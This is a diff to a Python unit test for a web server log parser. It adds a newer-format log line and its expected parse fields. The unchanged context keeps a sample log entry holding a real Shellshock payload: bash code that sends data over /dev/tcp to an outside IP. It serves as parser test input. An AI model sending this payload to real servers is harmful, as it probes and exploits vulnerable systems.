@@ -28,6 +28,10 @@ NEW_STYLE = """
 2015-06-28 08:13:39+0000 [-] 173.252.74.112 edsuom.com - [28/Jun/2015:08:13:39 +0000] "GET /pics/Sacrifice_of_Isaac-Caravaggio-640px.jpg HTTP/1.1" 200 161670 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
 """
 
+NEWER_STYLE = """
+2017-12-08T15:43:31+0000 [twisted.python.log#info] 77.75.78.166 examinationofthepearl.org - [08/Dec/2017:15:43:30 +0000] "GET /robots.txt HTTP/1.1" 200 105 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
+"""
+
 NASTY_SHIT = """
 2015-02-26 20:00:24+0000 [HTTPChannel,3229,68.116.30.102] 68.116.30.102 EVOLVINGOUTOFEDEN.ORG - [26/Feb/2015:20:00:24 +0000] "GET /cgi-bin/test-cgi HTTP/1.1" 302 234 "() { :;}; /bin/bash -c \"echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/tcp/23.227.199.185/80; echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/udp/23.227.199.185/80\"" "() { :;}; /bin/bash -c \"echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/tcp/23.227.199.185/80; echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/udp/23.227.199.185/80\"
 """
@@ -120,6 +124,15 @@ class TestParser(TestCase):
               "-",
               "facebookexternalhit/1.1 "+\
               "(+http://www.facebook.com/externalhit_uatext.php)"]),
+            (NEWER_STYLE,
+             ["examinationofthepearl.org",
+              "77.75.78.166",
+              dt(2017, 12, 8, 15, 43, 31),
+              "/robots.txt",
+              200,
+              "-",
+              "Mozilla/5.0 (compatible; SeznamBot/3.2; "+\
+              "+http://napoveda.seznam.cz/en/seznambot-intro/)"]),
         )
         for text, expected in textExpected:
             text = text.strip()
